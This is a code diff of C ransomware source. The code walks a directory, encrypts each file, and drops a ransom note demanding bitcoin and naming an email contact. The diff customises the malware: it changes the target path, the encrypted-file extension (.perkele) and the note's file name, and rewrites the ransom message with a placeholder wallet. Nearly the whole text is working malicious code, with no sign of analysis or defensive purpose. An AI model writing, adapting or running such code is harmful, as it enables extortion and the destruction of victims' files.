@@ -15,7 +15,7 @@ int main()
 
 
     char* start_path;
-    start_path = "/home/";
+    start_path = "/home/test/";
     ls_dir(start_path);
 
     return 0;
@@ -34,13 +34,13 @@ void ls_dir(char* start_path)
         {
             int len = strlen(ent->d_name);
             const char* last_four = &ent->d_name[len-4];
-            if(strcmp(last_four,".enc") != 0)
+            if(strcmp(last_four,".perkele") != 0)
             {
                 if(ent->d_type == 8)
                 {
-                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);
+                    char* full_path_readme =(char*) malloc(strlen("HOW_TO_DECRYPT")+strlen(start_path)+2);
                     strcpy(full_path_readme,start_path);
-                    strcat(full_path_readme,"RANSOMEWARE_INFO");
+                    strcat(full_path_readme,"HOW_TO_DECRYPT");
                     char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
                     strcpy(full_path,start_path);
                     strcat(full_path,ent->d_name);
@@ -58,7 +58,7 @@ void ls_dir(char* start_path)
                         fpout=fopen(new_name,"wb");
                         fpreadme=fopen(full_path_readme,"w");
 
-                        fprintf(fpreadme,"You have been PWNED! \n\n hehehehexD. Only Two Ways here.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an Decrpter \n\n Send 0.5btc now \n My Bitcoin Address:13dYMSYXL1BbFbicKM3jD78QN1ERckcXL4\n Email:root@roothaxor.com \n");
+                        fprintf(fpreadme,"All your files have been encrypted! \n\n The only way to restore them is to follow the next instructions.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email you back with a Decrypter \n\n Send 1BTC now \n My Bitcoin Wallet:this_is_a_bitcoin_wallet\n Email:root@perkele.com \n");
                         fclose(fpreadme);
 
                         encryptfile(fpin,fpout,key,iv);
